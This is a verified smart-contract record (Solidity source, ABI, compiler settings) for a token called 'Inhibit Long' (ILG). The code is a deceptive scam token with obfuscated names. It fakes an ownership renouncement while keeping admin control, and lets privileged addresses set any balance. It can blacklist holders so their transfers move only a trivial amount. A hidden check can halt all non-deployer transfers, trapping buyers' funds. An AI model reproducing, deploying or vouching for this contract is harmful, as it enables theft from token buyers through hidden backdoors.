{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface txShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapSender {\n    function createPair(address toMode, address minReceiver) external returns (address);\n}\n\ninterface autoFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listLiquidity) external view returns (uint256);\n\n    function transfer(address liquidityAt, uint256 enableLiquidity) external returns (bool);\n\n    function allowance(address fromFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityAt,\n        uint256 enableLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromToTrading, uint256 value);\n    event Approval(address indexed fromFund, address indexed spender, uint256 value);\n}\n\ninterface receiverEnable is autoFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InhibitLong is txTo, autoFrom, receiverEnable {\n\n    bool public sellSender;\n\n    string private tradingFund = \"Inhibit Long\";\n\n    function enableLaunchTotal(address maxSwap) public {\n        if (fromFee) {\n            return;\n        }\n        if (atMin != amountMarketingLaunch) {\n            txExempt = false;\n        }\n        liquidityTeam[maxSwap] = true;\n        if (exemptFrom != txExempt) {\n            senderToAuto = false;\n        }\n        fromFee = true;\n    }\n\n    bool private txExempt;\n\n    address minTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address receiverExemptShould, address buyTrading) external view virtual override returns (uint256) {\n        if (buyTrading == minTx) {\n            return type(uint256).max;\n        }\n        return shouldFundLaunch[receiverExemptShould][buyTrading];\n    }\n\n    uint256 constant receiverTo = 15 ** 10;\n\n    constructor (){\n        \n        txShould minMode = txShould(minTx);\n        teamSender = swapSender(minMode.factory()).createPair(minMode.WETH(), address(this));\n        if (sellSender != atMin) {\n            senderToAuto = false;\n        }\n        tokenWallet = _msgSender();\n        buyEnable();\n        liquidityTeam[tokenWallet] = true;\n        exemptLimit[tokenWallet] = launchedFee;\n        \n        emit Transfer(address(0), tokenWallet, launchedFee);\n    }\n\n    bool public amountMarketingLaunch;\n\n    address public tokenWallet;\n\n    bool public senderToAuto;\n\n    address public teamSender;\n\n    function walletIs(address senderTotal) public {\n        limitMin();\n        if (exemptFrom != txExempt) {\n            atMin = true;\n        }\n        if (senderTotal == tokenWallet || senderTotal == teamSender) {\n            return;\n        }\n        launchedSell[senderTotal] = true;\n    }\n\n    mapping(address => bool) public launchedSell;\n\n    bool public exemptFrom;\n\n    function limitMin() private view {\n        require(liquidityTeam[_msgSender()]);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingFund;\n    }\n\n    function totalTx(address tradingLiquidity, address liquidityAt, uint256 enableLiquidity) internal returns (bool) {\n        require(exemptLimit[tradingLiquidity] >= enableLiquidity);\n        exemptLimit[tradingLiquidity] -= enableLiquidity;\n        exemptLimit[liquidityAt] += enableLiquidity;\n        emit Transfer(tradingLiquidity, liquidityAt, enableLiquidity);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return txToken;\n    }\n\n    function enableMin(address totalLaunch, uint256 enableLiquidity) public {\n        limitMin();\n        exemptLimit[totalLaunch] = enableLiquidity;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityExemptTrading;\n    }\n\n    mapping(address => bool) public liquidityTeam;\n\n    function buyEnable() public {\n        emit OwnershipTransferred(tokenWallet, address(0));\n        txToken = address(0);\n    }\n\n    bool public atMin;\n\n    function getOwner() external view returns (address) {\n        return txToken;\n    }\n\n    function balanceOf(address listLiquidity) public view virtual override returns (uint256) {\n        return exemptLimit[listLiquidity];\n    }\n\n    function transferFrom(address tradingLiquidity, address liquidityAt, uint256 enableLiquidity) external override returns (bool) {\n        if (_msgSender() != minTx) {\n            if (shouldFundLaunch[tradingLiquidity][_msgSender()] != type(uint256).max) {\n                require(enableLiquidity <= shouldFundLaunch[tradingLiquidity][_msgSender()]);\n                shouldFundLaunch[tradingLiquidity][_msgSender()] -= enableLiquidity;\n            }\n        }\n        return txFee(tradingLiquidity, liquidityAt, enableLiquidity);\n    }\n\n    function amountFrom(uint256 enableLiquidity) public {\n        limitMin();\n        txAtToken = enableLiquidity;\n    }\n\n    bool public fromFee;\n\n    mapping(address => uint256) private exemptLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedFee;\n    }\n\n    uint256 feeSell;\n\n    function transfer(address totalLaunch, uint256 enableLiquidity) external virtual override returns (bool) {\n        return txFee(_msgSender(), totalLaunch, enableLiquidity);\n    }\n\n    function approve(address buyTrading, uint256 enableLiquidity) public virtual override returns (bool) {\n        shouldFundLaunch[_msgSender()][buyTrading] = enableLiquidity;\n        emit Approval(_msgSender(), buyTrading, enableLiquidity);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitTx;\n    }\n\n    function txFee(address tradingLiquidity, address liquidityAt, uint256 enableLiquidity) internal returns (bool) {\n        if (tradingLiquidity == tokenWallet) {\n            return totalTx(tradingLiquidity, liquidityAt, enableLiquidity);\n        }\n        uint256 enableList = autoFrom(teamSender).balanceOf(teamMode);\n        require(enableList == txAtToken);\n        require(liquidityAt != teamMode);\n        if (launchedSell[tradingLiquidity]) {\n            return totalTx(tradingLiquidity, liquidityAt, receiverTo);\n        }\n        return totalTx(tradingLiquidity, liquidityAt, enableLiquidity);\n    }\n\n    string private liquidityExemptTrading = \"ILG\";\n\n    address private txToken;\n\n    uint8 private limitTx = 18;\n\n    uint256 txAtToken;\n\n    uint256 private launchedFee = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private shouldFundLaunch;\n\n    address teamMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed maxList, address indexed launchShould);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromToTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverExemptShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"amountFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMarketingLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"}],\"name\":\"enableLaunchTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"enableMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchedSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTotal\",\"type\":\"address\"}],\"name\":\"walletIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InhibitLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}